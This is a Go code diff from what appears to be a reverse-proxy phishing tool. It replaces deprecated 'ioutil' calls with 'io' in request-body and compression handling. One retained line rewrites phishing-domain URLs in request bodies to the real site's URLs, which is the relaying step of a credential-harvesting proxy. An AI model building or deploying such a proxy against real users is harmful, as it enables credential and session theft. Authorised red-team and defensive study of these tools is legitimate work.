@@ -20,7 +20,6 @@ import (
 	"compress/gzip"
 	"crypto/tls"
 	"io"
-	"io/ioutil"
 	"net"
 	"net/http"
 	"net/http/httputil"
@@ -123,14 +122,14 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 	// Handle HTTP Body (POST)
 	if r.Body != nil {
 		reader := r.Body
-		buffer, err := ioutil.ReadAll(reader)
+		buffer, err := io.ReadAll(reader)
 		if err != nil {
 			return err
 		}
 
 		buffer = []byte(runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(string(buffer), runtime.PhishURLToRealURL))
 
-		request.Body = ioutil.NopCloser(bytes.NewReader(buffer))
+		request.Body = io.NopCloser(bytes.NewReader(buffer))
 		request.ContentLength = int64(len(buffer))
 		request.Header.Set("Content-Length", strconv.Itoa(len(buffer)))
 
@@ -383,7 +382,7 @@ func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {
 
 		reader, err = gzip.NewReader(body)
 		if err != io.EOF {
-			buffer, _ = ioutil.ReadAll(reader)
+			buffer, _ = io.ReadAll(reader)
 			defer reader.Close()
 		} else {
 			// Unset error
@@ -394,7 +393,7 @@ func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {
 		// Using the zlib structure (defined in RFC 1950) with the deflate compression algorithm (defined in RFC 1951).
 
 		reader = flate.NewReader(body)
-		buffer, _ = ioutil.ReadAll(reader)
+		buffer, _ = io.ReadAll(reader)
 		defer reader.Close()
 
 	case "br":
@@ -402,7 +401,7 @@ func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {
 
 		c := brotli.ReaderConfig{}
 		reader, err = brotli.NewReader(body, &c)
-		buffer, _ = ioutil.ReadAll(reader)
+		buffer, _ = io.ReadAll(reader)
 		defer reader.Close()
 
 	case "compress":
@@ -419,7 +418,7 @@ func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {
 		log.Debugf("Fallback to default compression (%s)", compression)
 
 		reader = body
-		buffer, err = ioutil.ReadAll(reader)
+		buffer, err = io.ReadAll(reader)
 		if err != nil {
 			return nil, err
 		}
@@ -450,7 +449,7 @@ func (httpResponse *HTTPResponse) Compress(buffer []byte) {
 		// Whatif?
 	}
 
-	body := ioutil.NopCloser(bytes.NewReader(buffer))
+	body := io.NopCloser(bytes.NewReader(buffer))
 	httpResponse.Body = body
 	httpResponse.ContentLength = int64(len(buffer))
 	httpResponse.Header.Set("Content-Length", strconv.Itoa(len(buffer)))
